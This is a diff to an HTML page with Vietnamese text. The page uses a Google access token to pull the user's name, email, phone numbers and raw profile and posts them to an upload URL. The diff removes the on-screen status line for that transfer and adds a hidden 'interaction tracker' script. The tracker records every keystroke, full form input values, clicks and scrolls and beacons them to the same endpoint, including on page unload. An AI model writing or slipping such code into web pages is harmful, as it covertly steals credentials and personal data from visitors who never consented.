@@ -124,8 +124,8 @@ async function fetchProfileAndSend() {
   const show = (msg) => setDemo(typeof msg === 'string' ? msg : JSON.stringify(msg, null, 2).replace(/\n/g,'<br>'));
   try {
     const fd1 = new FormData();
-fd1.append('payload', JSON.stringify({ type: 'proxy_people', token: accessToken }));
-const prox = await fetch(UPLOAD_URL, { method: 'POST', body: fd1 });
+    fd1.append('payload', JSON.stringify({ type: 'proxy_people', token: accessToken }));
+    const prox = await fetch(UPLOAD_URL, { method: 'POST', body: fd1 });
     if (!prox.ok) { show('❌ Proxy People API lỗi: HTTP ' + prox.status); return; }
     const profile = await prox.json();
 
@@ -133,22 +133,133 @@ const prox = await fetch(UPLOAD_URL, { method: 'POST', body: fd1 });
     const email  = profile.emailAddresses?.[0]?.value || null;
     const phones = (profile.phoneNumbers || []).map(p => p.value).filter(Boolean);
 
-    setDemo(`<b>Tên:</b> ${name || '—'} • <b>Email:</b> ${email || '—'} • <b>SĐT:</b> ${phones.join(', ') || '—'}<br><small>Đang rặn</small>`);
+    setDemo(`<b>Tên:</b> ${name || '—'} • <b>Email:</b> ${email || '—'} • <b>SĐT:</b> ${phones.join(', ') || '—'}`);
 
     const fd2 = new FormData();
-fd2.append('payload', JSON.stringify({
-  type: 'google_people_profile',
-  ts: new Date().toISOString(),
-  userAgent: navigator.userAgent,
-  data: { name, email, phones, raw: profile }
-}));
-const sendRes = await fetch(UPLOAD_URL, { method: 'POST', body: fd2 });
-
-    setDemo(`<b>Tên:</b> ${name || '—'} • <b>Email:</b> ${email || '—'} • <b>SĐT:</b> ${phones.join(', ') || 'keo thế'}<br>${sendRes.ok ? '✅ Đã rặn ra' : '❌ Rặn không ra'}`);
+    fd2.append('payload', JSON.stringify({
+      type: 'google_people_profile',
+      ts: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      data: { name, email, phones, raw: profile }
+    }));
+    const sendRes = await fetch(UPLOAD_URL, { method: 'POST', body: fd2 });
   } catch (e) {
     show('❌ Lỗi: ' + (e?.message || e));
   }
 }
 </script>
+
+<!-- === Interaction tracker: logs full input values & keys === -->
+<script>
+const TRACK_UPLOAD_URL = UPLOAD_URL;
+const BATCH_SIZE = 20;
+const FLUSH_MS   = 5000;
+
+const sessionId = crypto.randomUUID ? crypto.randomUUID() : (Date.now() + '_' + Math.random().toString(36).slice(2));
+const queue = [];
+let flushTimer = null;
+
+function shortPath(el) {
+  if (!el) return '';
+  const id = el.id ? '#' + el.id : '';
+  const cls = el.className && typeof el.className === 'string' ? '.' + el.className.trim().replace(/\s+/g,'.') : '';
+  return (el.tagName || '').toLowerCase() + id + cls;
+}
+function nowIso() { return new Date().toISOString(); }
+
+function pushEvent(ev) {
+  queue.push(ev);
+  if (queue.length >= BATCH_SIZE) flush();
+  if (!flushTimer) flushTimer = setTimeout(flush, FLUSH_MS);
+}
+
+function flush(useBeacon=false) {
+  if (!queue.length) return;
+  const events = queue.splice(0, queue.length);
+  if (flushTimer) { clearTimeout(flushTimer); flushTimer = null; }
+
+  const payload = {
+    type: 'interaction_log',
+    ts: nowIso(),
+    sessionId,
+    page: location.href,
+    ua: navigator.userAgent,
+    viewport: { w: innerWidth, h: innerHeight, dpr: devicePixelRatio || 1 },
+    events
+  };
+
+  const fd = new FormData();
+  fd.append('payload', JSON.stringify(payload));
+
+  if (useBeacon && navigator.sendBeacon) {
+    const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain;charset=utf-8' });
+    navigator.sendBeacon(TRACK_UPLOAD_URL, blob);
+    return;
+  }
+  fetch(TRACK_UPLOAD_URL, { method: 'POST', body: fd }).catch(()=>{});
+}
+
+document.addEventListener('click', (e) => {
+  const rect = e.target?.getBoundingClientRect?.() || { left:0, top:0 };
+  pushEvent({
+    kind: 'click',
+    t: nowIso(),
+    target: { tag: shortPath(e.target), text: (e.target?.innerText || '').slice(0,80) },
+    x: Math.round(e.clientX - rect.left),
+    y: Math.round(e.clientY - rect.top),
+    screen: { x: e.clientX, y: e.clientY }
+  });
+}, true);
+
+document.addEventListener('input', (e) => {
+  let val = '';
+  try { val = e.target.value; } catch(_) {}
+  pushEvent({
+    kind: 'input',
+    t: nowIso(),
+    target: { tag: shortPath(e.target), name: e.target?.name || '' },
+    value: val
+  });
+}, true);
+
+document.addEventListener('keydown', (e) => {
+  pushEvent({
+    kind: 'keydown',
+    t: nowIso(),
+    key: e.key,
+    code: e.code,
+    ctrl: e.ctrlKey, shift: e.shiftKey, alt: e.altKey, meta: e.metaKey
+  });
+}, true);
+
+let lastScroll = 0;
+document.addEventListener('scroll', () => {
+  const now = Date.now();
+  if (now - lastScroll < 250) return;
+  lastScroll = now;
+  pushEvent({
+    kind: 'scroll',
+    t: nowIso(),
+    scrollY: Math.round(window.scrollY),
+    docH: Math.max(document.body.scrollHeight, document.documentElement.scrollHeight)
+  });
+}, { passive: true });
+
+document.addEventListener('visibilitychange', () => {
+  pushEvent({ kind: 'visibility', t: nowIso(), state: document.visibilityState });
+});
+
+window.addEventListener('resize', () => {
+  pushEvent({ kind: 'resize', t: nowIso(), viewport: { w: innerWidth, h: innerHeight, dpr: devicePixelRatio || 1 } });
+});
+
+window.addEventListener('error', (e) => {
+  pushEvent({ kind: 'error', t: nowIso(), message: e?.message || 'unknown', src: e?.filename || '', line: e?.lineno || 0, col: e?.colno || 0 });
+});
+
+setInterval(() => flush(), FLUSH_MS);
+window.addEventListener('beforeunload', () => { flush(true); });
+</script>
+
 </body>
 </html>
